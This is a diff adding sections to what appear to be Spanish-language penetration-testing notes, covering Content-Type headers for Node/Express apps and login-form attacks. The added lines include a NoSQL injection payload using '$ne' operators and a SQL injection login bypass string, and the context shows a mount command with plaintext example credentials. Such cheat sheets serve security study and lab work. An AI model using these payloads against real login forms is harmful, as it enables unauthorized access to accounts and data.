@@ -140,6 +140,54 @@ mkdir /mnt/smb
 mount -t cifs //10.0.1.1/ACCT /mnt/smb -o username=Finance,password=Acc0unting,rw #Puedes poner solo r o ambas read write.
 ```
 
+## Node express etc
+
+Muchas veces esto trabaja con mongo y las vulnerabilidades reciden el los modulos que usa la propia app. Algunos content types
+
+```
+Content-Type: application/json
+
+{
+  "user": "admin",
+  "password": "whaever"
+}
+
+Content-Type: text/html; charset=UTF-8
+Content-Type: text/plain
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Type: application/octet-stream
+
+
+```
+
+## NOSQL LOGINS FORMS
+
+En los logins siempre prueba tanto inyecciones SQL como NO SQL
+
+```
+#NOSQL
+
+{
+
+  "user": {"$ne": "foo"},
+
+  "password": {"$ne": "bar"}
+
+}
+```
+
+> https://book.hacktricks.xyz/pentesting-web/nosql-injection
+
+SQL 
+
+```
+' or '1'='1-- -
+
+ETC
+```
+
+> https://book.hacktricks.xyz/pentesting-web/login-bypass
+
 ## FTP mount
 
 Cuando tiene credenciales y no quieres estar buscando uno por uno(carpeta)
